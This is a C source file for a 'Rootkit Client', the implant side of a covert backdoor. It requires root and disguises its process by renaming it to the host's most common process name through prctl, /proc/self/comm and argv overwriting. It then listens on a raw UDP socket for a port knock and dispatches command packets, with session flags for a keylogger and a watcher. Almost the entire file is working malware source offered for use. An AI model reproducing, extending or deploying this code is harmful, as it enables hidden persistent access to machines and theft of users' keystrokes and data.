#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include "utils.h"
#include "protocol.h"
#include <networking.h>
#include <sys/socket.h>
#include <sys/prctl.h>

void usage(const char * program_name) {
    printf("--------------------------------------------------------------------\n");
    printf("Rootkit Client\n");
    printf("--------------------------------------------------------------------\n");
    printf("Usage: %s [options]\n\n", program_name);
    printf("Options:\n");
    printf("\t --host       Address to bind (default: wlo or lo)\n");
    printf("\t --port       UDP port to listen on (default: 30)\n");
    printf("\t --max-bytes  Max datagram size to read (default: 2048)\n");
    printf("\t --poll-ms    select() timeout in ms (default: 200)\n");
}

static void signal_handler(const int sig_no) {
    if (sig_no == SIGINT || sig_no == SIGTERM) {
        fprintf(stderr, "Received signal %d, shutting down\n", sig_no);
        exit_flag = true;
        connection_loop = false;
    }
}

int parse_arguments(const int argc, char * argv[], struct client_options * client_options) {
    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "--host") == 0)
        {
            if (i + 1 >= argc)
            {
                usage(argv[0]);
                return 2;
            }
            client_options->host = argv[++i];
        }
        else if (strcmp(argv[i], "--port") == 0)
        {
            if (i + 1 >= argc)
            {
                usage(argv[0]);
                return 2;
            }

            if (!parse_int(argv[++i], &client_options->port) || client_options->port == 0)
            {
                usage(argv[0]);
                return 2;
            }
        }
        else if (strcmp(argv[i], "--max-bytes") == 0)
        {
            if (i + 1 >= argc)
            {
                usage(argv[0]);
                return 2;
            }

            if (!parse_int(argv[++i], &client_options->max_bytes) || client_options->max_bytes <= 0)
            {
                usage(argv[0]);
                return 2;
            }
        }
        else if (strcmp(argv[i], "--poll-ms") == 0)
        {
            if (i + 1 >= argc)
            {
                usage(argv[0]);
                return 2;
            }

            if (!parse_int(argv[++i], &client_options->poll_ms) || client_options->poll_ms <= 0)
            {
                usage(argv[0]);
                return 2;
            }
        }
        else
        {
            usage(argv[0]);
            return 2;
        }
    }

    return 0;
}

int wait_for_port_knock(const struct client_options * client_options) {
    const int return_val = listen_port_knock(client_options);
    if (return_val == -1) {
        fprintf(stderr, "Error while listening for port knock\n");
        return EXIT_FAILURE;
    }

    connection_loop = true;

    return EXIT_SUCCESS;
}

void rename_process_to_most_common(const int argc, char * argv[]) {
    process_record_t * records = calloc(MAX_PROCESSES, sizeof(process_record_t));
    if (records == NULL) {
        log_message("Failed to allocate process records");
        return;
    }

    const int count = collect_processes(records, MAX_PROCESSES);
    if (count == 0) {
        log_message("No processes found");
        free(records);
        return;
    }

    char most_common[MAX_NAME_LEN] = {0};
    find_most_common_name(records, count, most_common, sizeof(most_common));
    free(records);

    if (most_common[0] == '\0') {
        log_message("Could not determine most common process name");
        return;
    }

    log_message("Renaming process to: %s", most_common);

    if (prctl(PR_SET_NAME, most_common, 0, 0, 0) < 0) {
        perror("prctl PR_SET_NAME");
    }

    {
        FILE * comm_f = fopen("/proc/self/comm", "w");
        if (comm_f != NULL) {
            fputs(most_common, comm_f);
            fclose(comm_f);
        }
    }

    if (argc > 0 && argv[0] != NULL) {
        char * block_start = argv[0];
        char * block_end   = argv[0] + strlen(argv[0]);

        for (int i = 1; i < argc; i++) {
            if (argv[i] != NULL) {
                char * arg_end = argv[i] + strlen(argv[i]);
                if (arg_end > block_end) {
                    block_end = arg_end;
                }
            }
        }

        const size_t total    = (size_t)(block_end - block_start);
        const size_t name_len = strlen(most_common);

        memset(block_start, 0, total);
        memcpy(block_start, most_common, name_len < total ? name_len : total - 1);

        for (int i = 1; i < argc; i++) {
            argv[i] = NULL;
        }
    }
}

int main(const int argc, char * argv[]) {
    struct client_options client_options;
    client_options.program_path = argv[0];
    // Check if running as root
    if (geteuid() != 0) {
        fprintf(stderr, "Warning: Not running as root.\n");
        fprintf(stderr, "Run with: sudo %s\n\n", argv[0]);
        return EXIT_FAILURE;
    }

    if (signal(SIGINT, signal_handler) == SIG_ERR) {
        fprintf(stderr, "Cannot set SIGINT handler\n");
        return EXIT_FAILURE;
    }
    if (signal(SIGTERM, signal_handler) == SIG_ERR) {
        fprintf(stderr, "Cannot set SIGTERM handler\n");
        return EXIT_FAILURE;
    }
    const pid_t pid = getpid();
    printf("PID: %d\n", pid);

    rename_process_to_most_common(argc, argv);

    // Buffer to store knock source IP
    char knock_source_ip[INET_ADDRSTRLEN] = {0};
    client_options.host = get_local_address();
    client_options.interface_name = get_local_interface_name();
    client_options.port = 30;
    client_options.max_bytes = 2048;
    client_options.poll_ms = 200;
    client_options.knock_source_ip = knock_source_ip;

    int return_val = parse_arguments(argc, argv, &client_options);
    if (return_val != 0) {
        fprintf(stderr, "Error parsing arguments\n");
        return EXIT_FAILURE;
    }

    const int raw_socket = create_raw_udp_socket();

    if (raw_socket == -1) {
        fprintf(stderr, "Error creating raw socket\n");
        return EXIT_FAILURE;
    }

    return_val = bind_raw_socket(raw_socket, client_options.interface_name);
    if (return_val == -1) {
        fprintf(stderr, "Error binding raw socket to interface\n");
        close(raw_socket);
        return EXIT_FAILURE;
    }

    client_options.client_fd = raw_socket;

    const int flags = fcntl(raw_socket, F_GETFL, 0);
    fcntl(raw_socket, F_SETFL, flags | O_NONBLOCK);

    while (!exit_flag) {
        return_val = wait_for_port_knock(&client_options);
        if (return_val == EXIT_FAILURE) {
            return EXIT_FAILURE;
        }

        ssize_t n = 0;
        char buffer[RESPONSE_BUFFER_LENGTH];
        struct session_info session_info;
        session_info.head = NULL;
        session_info.client_options_ = &client_options;
        session_info.command_counter = 0;
        session_info.packet_counter = 0;
        session_info.data_counter = 0;
        session_info.run_keylogger = false;
        session_info.run_watcher = false;
        session_info.last_command_code = UNKNOWN;
        session_info.last_command_sequence_number = 0;

        while (connection_loop) {
            memset(buffer, 0, sizeof(buffer));

            fd_set fds;
            FD_ZERO(&fds);
            FD_SET(client_options.client_fd, &fds);

            struct timeval tv;
            tv.tv_sec = 0;
            tv.tv_usec = 100000;

            const int r = select(client_options.client_fd + 1, &fds, NULL, NULL, &tv);

            if (r < 0) {
                if (errno == EINTR)
                    continue;
                perror("select");
                break;
            }

            if (r == 0) {
                continue;
            }

            if (FD_ISSET(client_options.client_fd, &fds)) {
                n = recv(client_options.client_fd, buffer, sizeof(buffer), 0);

                if (n < 0) {
                    if (errno == EAGAIN || errno == EWOULDBLOCK) {
                        continue;
                    }
                    perror("recv");
                    break;
                }

                if (n > 0) {
                    struct packet_data * node = parse_raw_packet(buffer, n);
                    if (node != NULL) {
                        handle_packet_data(&session_info, node);
                    }
                }
            }
        }
        free_linked_list(session_info.head);
    }

    close(client_options.client_fd);

    return EXIT_SUCCESS;
}